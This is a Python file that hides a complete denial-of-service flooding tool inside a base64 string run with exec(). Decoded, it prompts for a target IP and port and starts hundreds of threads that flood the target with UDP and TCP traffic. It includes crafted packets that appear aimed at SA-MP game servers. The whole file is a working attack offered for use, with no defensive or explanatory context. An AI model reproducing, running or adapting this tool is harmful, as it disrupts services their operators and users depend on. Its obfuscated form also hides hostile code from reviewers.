import base64
exec(base64.b64decode(b'aW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBjb2RlY3MKaW1wb3J0IHN0cnVjdAppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCBzeXMKaW1wb3J0IG9zCgpvcy5zeXN0ZW0oImNsZWFyIikKcHJpbnQoIiIi4pSA4pSA4pSA4pSA4pSA4pSA4pSA4paE4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paE4paECuKUgOKUgOKUgOKUgOKWhOKWgOKWgOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWgOKWhArilIDilIDiloTiloDilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHiloDiloQK4pSA4pSA4paI4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paA4paECuKUgOKWkOKWjOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWhOKWhOKWhOKWhOKWhOKWhOKWhOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkOKWjArilIDilojilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHiloTiloTiloTiloTilpHilpHiloDiloDiloDiloDiloDilpHilpHilogK4paQ4paM4paR4paR4paR4paR4paR4paR4paR4paA4paA4paA4paA4paR4paR4paR4paR4paR4paA4paA4paA4paA4paA4paR4paR4paR4paQ4paMCuKWiOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWhOKWhOKWgOKWgOKWgOKWgOKWgOKWkeKWkeKWkeKWkeKWgOKWgOKWgOKWgOKWhOKWkeKWiArilojilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHiloDilpHilpHilpHilpDilpHilpHilpHilpHilpHilpDilowK4paQ4paM4paR4paR4paR4paR4paR4paR4paR4paR4paR4paQ4paA4paA4paI4paI4paE4paR4paR4paR4paR4paR4paR4paE4paE4paE4paR4paQ4paMCuKUgOKWiOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWgOKWgOKWgOKWkeKWkeKWkeKWkeKWkeKWkeKWgOKWgOKWiOKWiOKWkeKWkeKWiArilIDilpDilozilpHilpHilpHilpHiloTilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHilozilpHilpHilpHilpHilpHilpHilogK4pSA4pSA4paQ4paM4paR4paR4paQ4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paA4paE4paR4paR4paR4paR4paR4paICuKUgOKUgOKUgOKWiOKWkeKWkeKWkeKWjOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkOKWgOKWkeKWkeKWkeKWkeKWhOKWgOKWkeKWkeKWkeKWkOKWjArilIDilIDilIDilpDilozilpHilpHiloDiloTilpHilpHilpHilpHilpHilpHilpHilpHiloDilpHiloDilpHiloDiloDilpHilpHilpHiloTiloAK4pSA4pSA4pSA4paQ4paM4paR4paR4paQ4paA4paE4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paICuKUgOKUgOKUgOKWkOKWjOKWkeKWkeKWkeKWjOKWkeKWgOKWhOKWkeKWkeKWkeKWkeKWgOKWgOKWgOKWgOKWgOKWgOKWkeKWkeKWkeKWiArilIDilIDilIDilojilpHilpHilpHiloDilpHilpHilpHilpHiloDiloTilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHiloTiloAK4pSA4pSA4paQ4paM4paR4paR4paR4paR4paR4paR4paR4paR4paR4paR4paA4paE4paR4paR4paR4paR4paR4paR4paE4paACuKUgOKWhOKWgOKWkeKWkeKWkeKWhOKWgOKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWkeKWgOKWgOKWgOKWgOKWiOKWgAriloDilpHilpHilpHiloTiloDilpHilpHilpHilpHilpHilpHilpHilpHilpHilpHiloDilpHilpHilpHiloDiloDiloDiloDiloTiloTiloTiloTiloQKCiIiIikKcHJpbnQoIiIiSkFTVFJPIERBVEFORyIiIikKCmlwID0gc3RyKGlucHV0KCIgSVAgOiIpKQpwb3J0ID0gaW50KGlucHV0KCIgUG9ydCA6IikpCmNob2ljZSA9IHN0cihpbnB1dCgiIEdhcyAoeS9uKToiKSkKdGltZXMgPSBpbnQoaW5wdXQoIiBUaW1lcyA6IikpCnRocmVhZHMgPSBpbnQoaW5wdXQoIiBQYWtldCA6IikpCmZha2VfaXAgPSAnMTgyLjIxLjIwLjMyJwojU3RhcnRpbmcgQXR0YWNraW5nClBhY290ZXMgPSBbY29kZWNzLmRlY29kZSgiNTM0MTRkNTA5MGQ5MWQ0ZDYxMWU3MDBhNDY1YjAwIiwiaGV4X2NvZGVjIiksI3AKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCI1MzQxNGQ1MDk1MzhlMWE5NjExZTYzIiwiaGV4X2NvZGVjIiksI2MKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCI1MzQxNGQ1MDk1MzhlMWE5NjExZTY5IiwiaGV4X2NvZGVjIiksI2kKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCI1MzQxNGQ1MDk1MzhlMWE5NjExZTcyIiwiaGV4X2NvZGVjIiksI3IKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCIwODFlNjJkYSIsImhleF9jb2RlYyIpLCAjY29va2llIHBvcnQgNzc5NgogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjA4MWU3N2RhIiwiaGV4X2NvZGVjIiksI2Nvb2tpZSBwb3J0IDc3NzcKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCIwODFlNGRkYSIsImhleF9jb2RlYyIpLCNjb29raWUgcG9ydCA3NzcxCiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiMDIxZWZkNDAiLCJoZXhfY29kZWMiKSwjY29va2llIHBvcnQgNzc4NAogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjA4MWU3ZWRhIiwiaGV4X2NvZGVjIikjY29va2llIHBvcnQgNzc4NCB0YW1iZW0KICAgICAgICAgICAgICAgICAgICAgICBdCmRlZiBydW4oKToKCWRhdGEgPSByYW5kb20uX3VyYW5kb20oMTQ2MCkKCWkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpCgl3aGlsZSBUcnVlOgoJCXRyeToKCQkJcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQoJCQlhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6CgkJCQlzLnNlbmR0byhkYXRhLGFkZHIpCgkJCXByaW50KGkgKyIgSmFzdHJvIGluIGNvbWluZyIpCgkJZXhjZXB0OgoJCQlwcmludCgiWyFdICBKYXN0cm8gaW4gY29taW5nIikKCmRlZiBydW4yKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEyMDQpCglpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQoJd2hpbGUgVHJ1ZToKCQl0cnk6CgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCgkJCXMuY29ubmVjdCgoaXAscG9ydCkpCgkJCXMuc2VuZChkYXRhKQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6CgkJCQlzLnNlbmQoZGF0YSkKCQkJcHJpbnQoaSArIiBKYXN0cm8gaW4gY29taW5nIikKCQlleGNlcHQ6CgkJCXMuY2xvc2UoKQoJCQlwcmludCgiWypdIEphc3RybyBpbiBjb21pbmciKQogICAgICAgICAgICAKCmRlZiBydW4zKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDk5OSkKCWkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpCgl3aGlsZSBUcnVlOgoJCXRyeToKCQkJcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCQkJcy5jb25uZWN0KChpcCxwb3J0KSkKCQkJcy5zZW5kKGRhdGEpCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToKCQkJCXMuc2VuZChkYXRhKQoJCQlwcmludChpICsiIEphc3RybyBpbiBjb21pbmciKQoJCWV4Y2VwdDoKCQkJcy5jbG9zZSgpCgkJCXByaW50KCJbKl0gSmFzdHJvIGluIGNvbWluZyIpCiAgICAgICAgICAgIAogIApkZWYgcnVuNCgpOgoJZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSg4MTgpCglpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQoJd2hpbGUgVHJ1ZToKCQl0cnk6CgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCgkJCXMuY29ubmVjdCgoaXAscG9ydCkpCgkJCXMuc2VuZChkYXRhKQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6CgkJCQlzLnNlbmQoZGF0YSkKCQkJcHJpbnQoaSArIiBKYXN0cm8gaW4gY29taW5nIikKCQlleGNlcHQ6CgkJCXMuY2xvc2UoKQoJCQlwcmludCgiWypdIEphc3RybyBpbiBjb21pbmciKQoJCQkKZGVmIHJ1bjUoKToKCWRhdGEgPSByYW5kb20uX3VyYW5kb20oMTYpCglpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQoJd2hpbGUgVHJ1ZToKCQl0cnk6CgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCgkJCXMuY29ubmVjdCgoaXAscG9ydCkpCgkJCXMuc2VuZChkYXRhKQoJCQlmb3IgeCBpbiByYW5nZSh0aW1lcyk6CgkJCQlzLnNlbmQoZGF0YSkKCQkJcHJpbnQoaSArIiBKYXN0cm8gaW4gY29taW5nIikKCQlleGNlcHQ6CgkJCXMuY2xvc2UoKQoJCQlwcmludCgiWypdICBKYXN0cm8gaW4gY29taW5nIikKICAgICAgICAgICAgCiNVcmFuZG9tIERhbiBQYWNvdGVzCmNsYXNzIE15VGhyZWFkKHRocmVhZGluZy5UaHJlYWQpOgogICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldCgKICAgICAgICAgICAgICAgICAgICBzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG1zZyA9IFBhY290ZXNbcmFuZG9tLnJhbmRyYW5nZSgwLDUpXQogICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKG1zZywgKGlwLCBpbnQocG9ydCkpKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmKGludChwb3J0KSA9PSA3Nzc3KToKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhQYWNvdGVzWzVdLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICBlbGlmKGludChwb3J0KSA9PSA3Nzk2KToKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhQYWNvdGVzWzRdLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICBlbGlmKGludChwb3J0KSA9PSA3NzcxKToKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhQYWNvdGVzWzZdLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICBlbGlmKGludChwb3J0KSA9PSA3Nzg0KToKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhQYWNvdGVzWzddLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgZm9yIHggaW4gcmFuZ2UoMjAwKTogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgbXl0aHJlYWQgPSBNeVRocmVhZCgpICAKICAgICAgICAgICAgbXl0aHJlYWQuc3RhcnQoKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgdGltZS5zbGVlcCguMSkgICAgCiAgICBleGNlcHQoS2V5Ym9hcmRJbnRlcnJ1cHQpOgogICAgICAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKICAgICAgICAgCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgoJaWYgY2hvaWNlID09ICd5JzoKCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQoJCXRoLnN0YXJ0KCkKCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKCQl0aC5zdGFydCgpCgkJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjMpCgkJdGguc3RhcnQoKQoJCXRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW40KQoJCXRoLnN0YXJ0KCkKZWxzZToKCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuNSkKCQl0aC5zdGFydCgp'))